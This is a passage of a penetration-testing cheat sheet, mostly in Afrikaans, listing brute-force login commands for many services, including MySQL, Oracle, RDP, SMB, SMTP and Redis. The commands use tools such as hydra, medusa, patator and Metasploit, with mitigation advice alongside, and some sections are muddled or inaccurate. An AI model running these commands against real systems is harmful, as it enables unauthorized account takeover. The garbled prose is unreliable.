'n Brute Force-aanval teen MSSQL behels die poging om toegang te verkry tot 'n MSSQL-databasis deur verskeie moontlike kombinasies van gebruikersname en wagwoorde te probeer. Hier is 'n paar metodes wat gebruik kan word om 'n brute force-aanval teen MSSQL uit te voer:

1. **Woordelys-aanval**: Hierdie metode behels die gebruik van 'n woordelys van algemene wagwoorde om toegang te verkry tot 'n MSSQL-databasis. Die aanvaller sal elke wagwoord in die woordelys probeer totdat 'n suksesvolle trefslag bereik word.

2. **Brute Force-aanval met aangepaste wagwoordlys**: In hierdie geval sal die aanvaller 'n aangepaste wagwoordlys gebruik wat spesifiek ontwerp is vir die doelwit MSSQL-databasis. Hierdie wagwoordlys kan bestaan uit kombinasies van algemene wagwoorde, gebruikersname, en ander relevante inligting.

3. **Hybride aanval**: 'n Hybride aanval is 'n kombinasie van 'n woordelys-aanval en 'n brute force-aanval met aangepaste wagwoordlys. Dit behels die gebruik van 'n woordelys, gevolg deur die gebruik van aangepaste wagwoorde om toegang te verkry tot die MSSQL-databasis.

Dit is belangrik om te verseker dat sterk wagwoorde gebruik word en dat die MSSQL-databasis behoorlik beveilig is teen brute force-aanvalle.
```bash
legba mssql --username SA --password wordlists/passwords.txt --target localhost:1433
```
### MySQL

MySQL is 'n open-source relationele databasisbestuurstelsel wat gebruik word om data te stoor en te bestuur. Dit is baie gewild in die webontwikkelingsgemeenskap en word dikwels gebruik in kombinasie met PHP om dinamiese webtoepassings te bou.

MySQL maak gebruik van 'n gebruikersnaam en wagwoord om toegang tot die databasis te beperk. 'n Brute force-aanval is 'n tegniek wat gebruik word om toegang tot 'n MySQL-databasis te verkry deur verskeie kombinasies van gebruikersname en wagwoorde te probeer. Hierdie aanval is baie tydrowend, maar kan suksesvol wees as die regte kombinasie gevind word.

Daar is verskeie hulpmiddels en tegnieke beskikbaar om 'n brute force-aanval op 'n MySQL-databasis uit te voer. Een van die gewildste hulpmiddels is 'Hydra', wat 'n aanval kan uitvoer deur verskeie wagwoorde te probeer vir 'n gegewe gebruikersnaam. Dit kan ook gebruik word om 'n woordelys-aanval uit te voer, waar dit 'n lys van moontlike wagwoorde deurloop om toegang te verkry.

Dit is belangrik om te verseker dat sterk wagwoorde gebruik word en dat die MySQL-databasis korrek geïnstalleer en gekonfigureer is om die risiko van 'n brute force-aanval te verminder. Dit sluit in die gebruik van lang en komplekse wagwoorde, die beperking van toegang tot die databasis, en die monitering van verdagte aktiwiteit.
```bash
# hydra
hydra -L usernames.txt -P pass.txt <IP> mysql

# msfconsole
msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false

# medusa
medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on first success attempt> -t <threads> -M mysql

#Legba
legba mysql --username root --password wordlists/passwords.txt --target localhost:3306
```
### OracleSQL

Brute force is a technique used to crack passwords or gain unauthorized access to systems by systematically trying all possible combinations of passwords until the correct one is found. In the context of OracleSQL, brute force attacks can be used to guess the passwords of Oracle database users.

To perform a brute force attack on an Oracle database, you can use tools like Hydra or Medusa. These tools allow you to automate the process of trying different passwords against a target Oracle database.

Before attempting a brute force attack, it is important to gather information about the target Oracle database, such as the username and the Oracle SID (System Identifier). This information can be obtained through reconnaissance techniques like port scanning or banner grabbing.

Once you have the necessary information, you can start the brute force attack by specifying the target Oracle database, the username, and a password list. The tools will then systematically try each password in the list until the correct one is found or all passwords have been exhausted.

To increase the chances of success, it is recommended to use a large and diverse password list. This can include common passwords, dictionary words, and variations of known passwords. Additionally, you can also use password cracking techniques like hybrid attacks, which combine dictionary words with common patterns or modifications.

It is important to note that brute force attacks can be time-consuming and resource-intensive. They can also be detected by intrusion detection systems or trigger account lockouts if too many failed login attempts are made. Therefore, it is crucial to use caution and obtain proper authorization before attempting any brute force attacks.
```bash
patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017

./odat.py passwordguesser -s $SERVER -d $SID
./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt

#msf1
msf> use admin/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORT 1521
msf> set SID <SID>

#msf2, this option uses nmap and it fails sometimes for some reason
msf> use scanner/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORTS 1521
msf> set SID <SID>

#for some reason nmap fails sometimes when executing this script
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>

legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
```
Om **oracle\_login** met **patator** te gebruik, moet jy dit **installeer**:
```bash
pip3 install cx_Oracle --upgrade
```
[Aflynser OracleSQL-hash bruteforce](../network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**weergawes 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** en **11.2.0.3**):
```bash
nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
```
### POP

POP (Post Office Protocol) is 'n protokol wat gebruik word om e-pos van 'n e-posbediener af te haal en te lees. Dit is 'n algemene metode vir toegang tot e-posrekeninge en word dikwels gebruik deur e-poskliënte soos Outlook en Thunderbird.

Brute force-aanvalle kan gebruik word om POP-wagwoorde te kraak deur verskillende kombinasies van gebruikersname en wagwoorde te probeer totdat die regte kombinasie gevind word. Dit kan gedoen word deur 'n woordelys van algemene wagwoorde te gebruik of deur 'n woordelys te skep wat spesifiek is vir die teikengebruiker.

Dit is belangrik om te onthou dat brute force-aanvalle tydrowend kan wees en dat daar 'n risiko is om opgespoor te word. Dit is dus raadsaam om ander metodes, soos sosiale ingenieurswese of phising, te oorweeg voordat brute force-aanvalle gebruik word.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V

# Insecure
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:110

# SSL
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:995 --pop3-ssl
```
### PostgreSQL

PostgreSQL is 'n open source objek-relasionele databasisbestuurstelsel (ORDBMS) wat bekend staan ​​om sy betroubaarheid, skaalbaarheid en uitgebreide funksieset. Dit word dikwels gebruik in webtoepassings, data-analise en geografiese inligtingstelsels.

#### Brute Force-aanvalle op PostgreSQL

'n Brute Force-aanval op PostgreSQL behels die poging om toegang te verkry tot 'n PostgreSQL-databasis deur herhaaldelik verskillende wagwoorde te probeer totdat die regte een gevind word. Hier is 'n paar metodes wat gebruik kan word om 'n brute force-aanval op PostgreSQL uit te voer:

1. **Woordelysgebaseerde aanval**: Hierdie metode behels die gebruik van 'n woordelys van algemene wagwoorde om toegang te probeer verkry. Dit is 'n effektiewe metode as die regte wagwoord in die woordelys voorkom.

2. **Brute Force-aanval met aangepaste wagwoordlys**: Hierdie metode behels die gebruik van 'n aangepaste wagwoordlys wat spesifiek vir die teiken PostgreSQL-databasis ontwikkel is. Dit kan wagwoorde insluit wat verband hou met die teikenorganisasie of gebruiker.

3. **Brute Force-aanval met willekeurige wagwoorde**: Hierdie metode behels die gebruik van 'n program wat willekeurige wagwoorde genereer en probeer om toegang te verkry deur elke moontlike kombinasie te probeer. Dit is 'n tydrowende metode, maar kan suksesvol wees as die regte wagwoord kort genoeg is.

#### Voorkoming van Brute Force-aanvalle op PostgreSQL

Om brute force-aanvalle op PostgreSQL te voorkom, kan die volgende maatreëls geneem word:

1. **Sterk wagwoordbeleid**: Implementeer 'n sterk wagwoordbeleid wat gebruikers dwing om lang en komplekse wagwoorde te gebruik. Dit sal die tyd wat nodig is om 'n wagwoord te kraak, aansienlik verhoog.

2. **Tweefaktor-verifikasie**: Implementeer tweefaktor-verifikasie om 'n ekstra laag sekuriteit toe te voeg. Dit vereis dat gebruikers 'n tweede vorm van verifikasie, soos 'n eenmalige wagwoord of biometriese inligting, voorsien voordat hulle toegang tot die databasis verkry.

3. **Beperkings op mislukte aanmeldpogings**: Stel beperkings in vir die aantal mislukte aanmeldpogings wat 'n gebruiker kan hê voordat hulle tydelik geblokkeer word. Dit sal die effektiwiteit van 'n brute force-aanval verminder.

4. **Monitor vir verdagte aktiwiteit**: Monitor die databasis vir enige verdagte aktiwiteit, soos 'n ongewoon groot aantal aanmeldpogings. Dit kan dui op 'n brute force-aanval en kan vinnige reaksie en herstel moontlik maak.

Deur hierdie maatreëls te implementeer, kan die risiko van 'n suksesvolle brute force-aanval op PostgreSQL aansienlik verminder word.
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP>:5432
patator pgsql_login host=<IP> user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
use auxiliary/scanner/postgres/postgres_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
legba pgsql --username admin --password wordlists/passwords.txt --target localhost:5432
```
### PPTP

Jy kan die `.deb` pakkie aflaai om te installeer vanaf [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)
```bash
sudo dpkg -i thc-pptp-bruter*.deb #Install the package
cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
```
### RDP

RDP (Remote Desktop Protocol) is 'n protokol wat gebruik word om 'n gebruiker toe te laat om 'n rekenaarstelsel vanaf 'n afstand te beheer. Dit word dikwels gebruik om toegang tot 'n afgeleë rekenaar te verkry en dit te bestuur asof jy fisiek voor die rekenaar sit.

#### Brute Force-aanvalle teen RDP

'n Brute Force-aanval teen RDP behels die poging om die regte gebruikersnaam en wagwoord te raai deur verskeie kombinasies te probeer. Dit kan gedoen word deur 'n woordelys van algemene wagwoorde te gebruik of deur alle moontlike kombinasies van karakters te probeer.

Hier is 'n paar metodes wat gebruik kan word om 'n brute force-aanval teen RDP uit te voer:

1. Woordelys-aanval: Hierdie metode behels die gebruik van 'n woordelys van algemene wagwoorde om te probeer om die regte wagwoord te raai. Dit is 'n vinnige en eenvoudige metode, maar dit is afhanklik van die wagwoord wat gebruik word.

2. Woordeboek-aanval: Hierdie metode behels die gebruik van 'n woordeboek van algemene woorde en frases om te probeer om die regte wagwoord te raai. Dit is 'n meer uitgebreide metode as 'n woordelys-aanval, maar dit kan meer tyd neem om die regte wagwoord te vind.

3. Brute Force-aanval met alle moontlike kombinasies: Hierdie metode behels die probeer van alle moontlike kombinasies van karakters om die regte wagwoord te vind. Dit is 'n baie tydrowende metode, maar dit kan die regte wagwoord vind as dit korrek geïmplementeer word.

Dit is belangrik om te onthou dat die uitvoering van 'n brute force-aanval teen RDP onwettig is sonder die toestemming van die eienaar van die rekenaarstelsel. Dit word aanbeveel om slegs hierdie tegniek te gebruik vir wettige doeleindes, soos om die veiligheid van 'n rekenaarstelsel te toets of om toestemming te verkry om 'n rekenaarstelsel te toets.
```bash
ncrack -vv --user <User> -P pwds.txt rdp://<IP>
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
legba rdp --target localhost:3389 --username admin --password data/passwords.txt [--rdp-domain <RDP_DOMAIN>] [--rdp-ntlm] [--rdp-admin-mode] [--rdp-auto-logon]
```
### Redis

Redis is 'n in-memory data store wat gebruik word vir die stoor en ophaling van data. Dit bied 'n vinnige en effektiewe manier om data te hanteer deur middel van sleutel-waarde pare. Redis ondersteun verskillende datastrukture soos strings, lyste, stelle, kaarte en nog baie meer.

#### Brute Force-aanvalle teen Redis

'n Brute force-aanval teen Redis behels die poging om toegang te verkry tot 'n Redis-stelsel deur middel van die uitvoering van 'n groot aantal moontlike kombinasies van gebruikersname en wagwoorde. Hierdie aanval is gebaseer op die feit dat baie gebruikers swak of maklik te raai wagwoorde gebruik.

Om 'n brute force-aanval teen Redis uit te voer, kan 'n hacker 'n gereedskap soos Hydra of Medusa gebruik. Hierdie gereedskap maak dit moontlik om 'n groot aantal pogings in 'n kort tydperk uit te voer deur gebruik te maak van 'n woordelys van potensiële wagwoorde.

Om 'n brute force-aanval teen Redis te voorkom, is dit belangrik om sterk en unieke wagwoorde te gebruik. Dit kan ook nuttig wees om 'n stelsel te implementeer wat verdagte pogings om toegang te verkry tot die Redis-stelsel opspoor en blokkeer.
```bash
msf> use auxiliary/scanner/redis/redis_login
nmap --script redis-brute -p 6379 <IP>
hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
legba redis --target localhost:6379 --username admin --password data/passwords.txt [--redis-ssl]
```
### Rexec

Rexec is 'n protokol wat gebruik word om op afstand uitvoerbare programme op 'n bediener uit te voer. Dit maak gebruik van 'n gebruikersnaam en wagwoord vir verifikasie. Rexec is 'n potensiële aanvalsvektor vir 'n brute force-aanval, waar 'n aanvaller probeer om deur herhaaldelike pogings om verskillende kombinasies van gebruikersname en wagwoorde te raai, toegang tot die bediener te verkry.

Om 'n brute force-aanval teen Rexec uit te voer, kan 'n aanvaller 'n woordelys van moontlike wagwoorde gebruik en dit een vir een probeer totdat die regte kombinasie gevind word. Dit kan 'n tydrowende proses wees, maar as die wagwoord swak is of maklik te raai is, kan die aanvaller suksesvol wees.

Dit is belangrik om sterk en unieke wagwoorde te gebruik om te voorkom dat 'n brute force-aanval suksesvol is. Daar is ook tegnieke soos die implementering van 'n wagwoordbeleid, die gebruik van tweefaktor-verifikasie en die beperking van die aantal mislukte aanmeldingspogings wat kan help om die risiko van 'n brute force-aanval te verminder.
```bash
hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
```
### Rlogin

Rlogin is 'n protokol wat gebruik word om 'n verband te maak met 'n afgeleë rekenaar oor 'n netwerk. Dit maak gebruik van 'n eenvoudige gebruikersnaam en wagwoord vir verifikasie. Rlogin is 'n onveilige protokol omdat dit nie versleuteling gebruik nie, wat beteken dat die gebruikersnaam en wagwoord in die oop gesien kan word deur 'n aanvaller wat die netwerkverkeer onderskep.

Brute force-aanvalle kan gebruik word om toegang te verkry tot 'n rlogin-rekening deur verskeie kombinasies van gebruikersname en wagwoorde te probeer. Hierdie aanvalle kan uitgevoer word met behulp van gereedskap soos Hydra of Medusa, wat outomatiese aanvalle op rlogin-dienste kan uitvoer deur 'n woordelys van moontlike wagwoorde te gebruik.

Dit is belangrik om te verseker dat sterk en unieke wagwoorde gebruik word vir rlogin-rekeninge om die risiko van 'n suksesvolle brute force-aanval te verminder. Daarbenewens kan die implementering van 'n veiliger protokol soos SSH oorweeg word om die veiligheid van die netwerkverbindings te verbeter.
```bash
hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
```
### Rsh

Rsh (Remote Shell) is a network protocol that allows users to execute commands on a remote system. It is commonly used for remote administration tasks. 

#### Brute-Forcing Rsh

To brute-force Rsh, you can use tools like Hydra or Medusa. These tools automate the process of trying different username and password combinations until a successful login is found. 

Here is an example command using Hydra to brute-force Rsh:

```plaintext
hydra -l <username> -P <password_list> rsh://<target_ip>
```

Replace `<username>` with the target username, `<password_list>` with the path to a file containing a list of passwords, and `<target_ip>` with the IP address of the target system.

#### Mitigating Rsh Brute-Force Attacks

To protect against Rsh brute-force attacks, it is recommended to disable the Rsh service if it is not needed. If Rsh is required, strong passwords should be used and account lockout policies should be implemented to prevent multiple failed login attempts. Additionally, monitoring and logging of Rsh login attempts can help detect and respond to brute-force attacks.
```bash
hydra -L <Username_list> rsh://<Victim_IP> -v -V
```
[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)

### Rsync

Rsync is a utility commonly used for file synchronization and transfer. It allows for efficient copying and updating of files between different systems. Rsync uses the SSH protocol for secure communication and can be used both locally and remotely. It is particularly useful for transferring large files or directories and can be automated for regular backups or data replication. Rsync supports various options and can be customized to suit specific needs.
```bash
nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
```
### RTSP

RTSP (Real Time Streaming Protocol) is 'n protokol wat gebruik word vir die stroomlynige oordrag van multimedia data oor IP-netwerke. Dit word dikwels gebruik vir die stroomlynige uitsending van video- en klankinhoud. RTSP maak gebruik van die TCP- of UDP-protokol vir die oordrag van data.

#### Brute Force-aanvalle teen RTSP

'n Brute Force-aanval teen 'n RTSP-diens behels die outomatiese poging van verskillende kombinasies van gebruikersname en wagwoorde om toegang tot die diens te verkry. Hierdie aanvalle kan uitgevoer word deur gebruik te maak van gereedskap soos Hydra of Medusa.

Om 'n suksesvolle brute force-aanval teen 'n RTSP-diens uit te voer, is dit belangrik om 'n lys van algemene gebruikersname en wagwoorde te hê. Hierdie lys kan bestaan uit standaardwaardes wat dikwels gebruik word deur gebruikers of beheerders. Dit is ook nuttig om te kyk na enige gelekte wagwoorde wat verband hou met die betrokke RTSP-diens.

Daarbenewens kan dit nuttig wees om 'n woordelys te gebruik wat bestaan uit algemene woorde, frases en kombinasies wat dikwels gebruik word as wagwoorde. Hierdie woordelys kan gebruik word deur gereedskap soos Hydra of Medusa om die brute force-aanval uit te voer.

Dit is belangrik om te onthou dat brute force-aanvalle tydrowend kan wees en dat dit 'n groot hoeveelheid pogings kan vereis voordat 'n suksesvolle kombinasie van gebruikersname en wagwoorde gevind word. Daarom is dit belangrik om geduldig te wees en om die nodige tyd en hulpbronne toe te ken aan die uitvoering van die aanval.
```bash
hydra -l root -P passwords.txt <IP> rtsp
```
### SFTP

SFTP (Secure File Transfer Protocol) is 'n veilige protokol wat gebruik word vir die oordrag van lêers tussen 'n kliënt en 'n bediener. Dit bied 'n veilige en versleutelde verbinding om te verseker dat die oorgedraagde data beskerm word teen afluistering en manipulasie.

SFTP maak gebruik van 'n sterk kriptografiese protokol om die data te beskerm. Dit maak gebruik van 'n sleuteluitruilproses om 'n veilige sessiesleutel te genereer, wat dan gebruik word om die data te versleutel en te ontsluit. Hierdie versleuteling verseker dat slegs die beoogde ontvanger toegang tot die data het.

Om SFTP te gebruik, moet jy 'n SFTP-kliënt installeer en konfigureer. Die kliënt stel jou in staat om 'n veilige verbinding met die SFTP-bedieners te maak en lêers oor te dra. Jy sal die nodige inligting, soos die bedieneradres, gebruikersnaam en wagwoord, benodig om die verbinding op te stel.

SFTP kan gebruik word vir verskeie doeleindes, soos die oordra van lêers tussen gebruikers, die maak van rugsteunkopieë van data, en die deel van lêers met ander gebruikers. Dit is 'n veilige en betroubare manier om lêers oor te dra en te deel, en word dikwels gebruik in omgewings waar data-integriteit en vertroulikheid belangrik is.
```bash
legba sftp --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba sftp --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```
### SNMP

SNMP (Simple Network Management Protocol) is 'n protokol wat gebruik word om netwerktoestelle te bestuur en te moniteer. Dit maak gebruik van 'n klient-bedienersmodel, waar die SNMP-bestuurder funksies uitvoer op die SNMP-agent op die toestel.

SNMP maak gebruik van 'n reeks standaardopdragte om inligting van die toestel te bekom en om konfigurasie-aanpassings te maak. Hierdie opdragte sluit in:

- `GET`: Versoek om 'n spesifieke inligtingswaarde van die toestel te kry.
- `SET`: Stel 'n spesifieke inligtingswaarde op die toestel in.
- `GETNEXT`: Versoek om die volgende inligtingswaarde in 'n reeks waardes te kry.
- `GETBULK`: Versoek om 'n groot hoeveelheid inligtingswaardes in een keer te kry.
- `TRAP`: Stuur 'n kennisgewing na die bestuurder wanneer 'n spesifieke gebeurtenis plaasvind.

SNMP is 'n nuttige hulpmiddel vir netwerkbestuur en -monitering, maar dit kan ook 'n potensiële veiligheidsrisiko wees as dit nie behoorlik geïmplementeer en beveilig word nie. Dit is belangrik om sterk gemeenskapstrings te gebruik, toegang tot SNMP-dienste te beperk en die nodige veiligheidsmaatreëls te tref om te verseker dat slegs geaggregeerde inligting verkry word en dat geen sensitiewe inligting blootgestel word nie.
```bash
msf> use auxiliary/scanner/snmp/snmp_login
nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <IP>
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
```
### SMB

SMB (Server Message Block) is 'n protokol wat gebruik word vir die deel van lêers, drukkers, portefeuljes en ander hulpbronne tussen rekenaars op 'n netwerk. Dit is 'n belangrike protokol vir Windows-omgewings en word gebruik vir die bestuur van lêertoegang en netwerkverbindings.

#### Brute Force-aanvalle op SMB

'n Brute Force-aanval op SMB is 'n metode waar 'n aanvaller probeer om toegang te verkry tot 'n SMB-bedienaar deur verskeie wagwoorde te probeer. Die aanvaller gebruik 'n lys van potensiële wagwoorde en probeer elkeen totdat die regte wagwoord gevind word. Hierdie tipe aanval kan baie tydrowend wees, maar dit kan suksesvol wees as die regte wagwoord swak of maklik te raai is.

#### Beskerming teen Brute Force-aanvalle op SMB

Om jou SMB-bedienaar teen brute force-aanvalle te beskerm, kan jy die volgende maatreëls tref:

- Stel 'n sterk wagwoordbeleid in wat vereis dat gebruikers sterk en unieke wagwoorde gebruik.
- Beperk die aantal mislukte aanmeldpogings wat 'n gebruiker kan maak voordat hulle tydelik geblokkeer word.
- Implementeer 'n multi-faktor-verifikasie-stelsel om die aanmeldproses te versterk.
- Monitor en analiseer aanmeldpogings om verdagte aktiwiteit te identifiseer.
- Verseker dat jou SMB-bedienaar opgedateer is met die nuutste veiligheidsoplossings en patches.

Deur hierdie maatreëls te implementeer, kan jy die risiko van 'n suksesvolle brute force-aanval op jou SMB-bedienaar verminder.
```bash
nmap --script smb-brute -p 445 <IP>
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
legba smb --target share.company.com --username admin --password data/passwords.txt [--smb-workgroup <SMB_WORKGROUP>] [--smb-share <SMB_SHARE>]
```
### SMTP

SMTP (Simple Mail Transfer Protocol) is 'n protokol wat gebruik word om e-posse te stuur en te ontvang. Dit is 'n algemene protokol wat deur e-posdienste gebruik word om kommunikasie tussen verskillende e-posbedieners te fasiliteer.

SMTP-bruteforcing is 'n tegniek wat gebruik word om toegang tot 'n e-posrekening te verkry deur verskeie kombinasies van gebruikersname en wagwoorde te probeer. Dit kan gedoen word deur 'n program of 'n spesifieke gereedskap wat ontwerp is vir SMTP-bruteforcing.

Hier is 'n voorbeeld van hoe 'n bruteforce-aanval op 'n SMTP-bedienaar sou lyk:

```plaintext
EHLO example.com
AUTH LOGIN
Username: admin
Password: password1
```

In hierdie voorbeeld word die EHLO-opdrag gebruik om die identiteit van die afstuurder te identifiseer. Dan word die AUTH LOGIN-opdrag gebruik om die gebruikersnaam en wagwoord te verifieer. In hierdie geval word die gebruikersnaam as "admin" en die wagwoord as "password1" gespesifiseer.

Dit is belangrik om te onthou dat SMTP-bruteforcing 'n aanval is en dat dit onwettig is om dit sonder toestemming uit te voer. Dit word meestal gebruik deur etiese hackers en sekuriteitskonsultante as 'n metode om die veiligheid van 'n e-posstelsel te toets.
```bash
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
legba smtp --username admin@example.com --password wordlists/passwords.txt --target localhost:25 [--smtp-mechanism <mech>]
```
### SOCKS

SOCKS (Socket Secure) is 'n protokol wat gebruik word om 'n veilige verbinding te skep tussen 'n klient en 'n bediener deur middel van 'n proxy-bedienersagteware. Dit maak dit moontlik vir die klient om verbindings te maak met bedieners agter 'n vuremuur of NAT (Network Address Translation) en om anoniem te bly deur die IP-adres van die klient te verberg.

SOCKS-protokol ondersteun verskillende weergawes, insluitend SOCKS4 en SOCKS5. SOCKS5 is die mees gebruikte weergawe en bied aanvullende funksies soos outentisering en UDP (User Datagram Protocol) deurvoer.

Brute force-aanvalle kan uitgevoer word deur SOCKS te gebruik om verbindings te maak met 'n bediener en dan verskillende wagwoorde of sleutels te probeer om toegang te verkry tot 'n stelsel of rekening. Hierdie aanvalte kan gebruik word om swak wagwoordbeleide te misbruik of om toegang te verkry tot rekeninge deur middel van herhaalde pogings.

Dit is belangrik om te verseker dat sterk wagwoorde gebruik word en dat toegang tot die SOCKS-bedienersagteware beperk word tot vertroude gebruikers om brute force-aanvalle te voorkom.
```bash
nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt
# With alternative address
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt --socks5-address 'internal.company.com' --socks5-port 8080
```
### SQL Server

SQL Server is 'n relatiewe databasisbestuurstelsel wat deur Microsoft ontwikkel is. Dit bied 'n veilige en betroubare omgewing vir die stoor en bestuur van data. SQL Server ondersteun 'n verskeidenheid van funksies en tegnieke vir die hantering van data, insluitend die gebruik van SQL (Structured Query Language) vir die uitvoering van vrae en manipulasie van data.

#### Brute Force-aanvalle op SQL Server

'N Brute Force-aanval is 'n aanvalstegniek wat gebruik word om toegang te verkry tot 'n SQL Server-databasis deur herhaaldelik te probeer om gebruikersname en wagwoorde te raai. Hierdie aanval maak gebruik van 'n lys van moontlike gebruikersname en wagwoorde en probeer elke kombinasie totdat die regte kombinasie gevind word.

Om 'n Brute Force-aanval op 'n SQL Server-databasis uit te voer, kan 'n aanvaller gebruik maak van verskillende hulpmiddels en tegnieke, soos:

- **Woordelys-aanval**: Hierdie aanval maak gebruik van 'n lys van algemene woorde en wagwoorde om te probeer om toegang te verkry tot die databasis. Die aanvaller kan 'n woordelys van algemene wagwoorde gebruik, soos "password" of "123456", of 'n spesifieke woordelys wat relevant is vir die teikenomgewing.
- **Brute Force-aanval met kragtige rekenaarbronne**: Hierdie aanval maak gebruik van 'n kragtige rekenaarbronne, soos 'n GPU (Graphics Processing Unit) of 'n stel hoëpresterende rekenaars, om 'n groot aantal kombinasies van gebruikersname en wagwoorde vinnig te probeer. Dit kan die tyd wat nodig is om 'n suksesvolle aanval uit te voer, aansienlik verkort.
- **Brute Force-aanval met parallelle verwerking**: Hierdie aanval maak gebruik van parallelle verwerkingstegnieke om gelyktydig 'n groot aantal kombinasies van gebruikersname en wagwoorde te probeer. Dit kan die tyd wat nodig is om 'n suksesvolle aanval uit te voer, verminder.

Om 'n Brute Force-aanval op 'n SQL Server-databasis te voorkom, kan die volgende maatreëls geneem word:

- **Sterk wagwoordbeleid**: Implementeer 'n sterk wagwoordbeleid wat vereis dat gebruikers sterk en unieke wagwoorde gebruik. Dit kan die moeilikheid verhoog om 'n wagwoord te raai deur 'n Brute Force-aanvaller.
- **Beperk aantal pogings**: Beperk die aantal pogings wat 'n gebruiker kan maak om in te teken op die SQL Server-databasis. Deur die aantal pogings te beperk, kan dit moeiliker wees vir 'n Brute Force-aanvaller om suksesvolle kombinasies van gebruikersname en wagwoorde te vind.
- **Tweeledige verifikasie**: Implementeer tweeledige verifikasie vir toegang tot die SQL Server-databasis. Hierdie maatreël vereis dat gebruikers 'n tweede vorm van verifikasie, soos 'n eenmalige wagwoord of 'n biometriese identifikasie, gebruik om toegang te verkry.
- **Monitoraktiwiteit**: Monitor die aktiwiteit op die SQL Server-databasis om verdagte pogings tot Brute Force-aanvalle te identifiseer. Deur aktiwiteit te monitor, kan potensiële aanvalle vroegtydig opgespoor en voorkom word.

Dit is belangrik om te verseker dat die SQL Server-databasis behoorlik beveilig is teen Brute Force-aanvalle om die integriteit en vertroulikheid van die data te beskerm.
```bash
#Use the NetBIOS name of the machine as domain
crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssql
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
```
### SSH

SSH (Secure Shell) is 'n protokol wat gebruik word vir veilige kommunikasie en veilige toegang tot 'n afgeleë stelsel. Dit bied 'n veilige manier om op afstand te verbind met 'n stelsel en dit te bestuur. SSH maak gebruik van kriptografie om die vertroulikheid en integriteit van die data wat oorgedra word te verseker.

#### Brute Force-aanvalle op SSH

'n Brute Force-aanval op SSH is 'n metode waar 'n aanvaller probeer om toegang te verkry tot 'n SSH-stelsel deur verskeie moontlike kombinasies van gebruikersname en wagwoorde te probeer. Die aanvaller gebruik 'n program of skripsie om outomaties die kombinasies te probeer, totdat die regte kombinasie gevind word.

Hier is 'n paar tegnieke wat gebruik kan word om 'n brute force-aanval op SSH te voorkom:

- **Sterk wagwoorde**: Gebruik lang en komplekse wagwoorde wat moeilik is om te raai.
- **Tweefaktor-verifikasie**: Stel tweefaktor-verifikasie in vir SSH, wat 'n ekstra laag van beveiliging bied deur 'n tweede verifikasiefaktor te vereis, soos 'n eenmalige wagwoord of 'n biometriese identifikasie.
- **Beperk toegang**: Beperk die toegang tot SSH deur slegs spesifieke IP-adresse of subnetwerke toe te laat.
- **Monitor aktiwiteit**: Monitor die SSH-loglêers vir verdagte aktiwiteit, soos herhaalde mislukte aanmeldingspogings.
- **Verander die standaard SSH-poort**: Verander die standaard SSH-poort na 'n ander poort om die aanvallers te ontmoedig.
